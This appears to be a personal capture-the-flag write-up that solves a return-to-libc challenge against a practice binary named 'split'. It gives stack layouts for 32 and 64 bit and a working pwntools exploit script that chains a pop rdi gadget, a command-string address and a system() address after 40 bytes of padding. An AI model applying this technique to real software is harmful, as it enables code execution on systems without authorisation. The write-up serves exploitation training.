# Solution
This challenge is using a textbook [[Low Level/Return-to-libc attack]].

We need 2/3 things:
1. Address of `/bin/cat flag.txt`
2. Address of `system()`
3. A gadget, <span class=red>**only for 64bit**</span>. Here's [[Low Level/Return-to-libc attack#^119a44 | why]].
Since we only need to pass one parameter, we need a gadget that place our paramater (located in the stack) into register `RDI`.

## 32 bit
```bash
| padding | system addr | parameter |
```

<span class=red>**system addr contains null bytes. how to bypass?**</span>

## 64 bit 
```bash
| padding | gadget | parameter | system addr | 
```

```python
from pwn import *

p = process("./split")

gadget = p64(0x00000000004007c3) # pop rdi; ret;
argument = p64(0x00601060) # /bin/cat flag.txt
system_addr = p64(0x7ffff7e35850) # system()

payload = b"A"*40 + gadget + argument + system_addr

p.recvuntil(b">")
p.send(payload)

print(p.recvall().decode())
```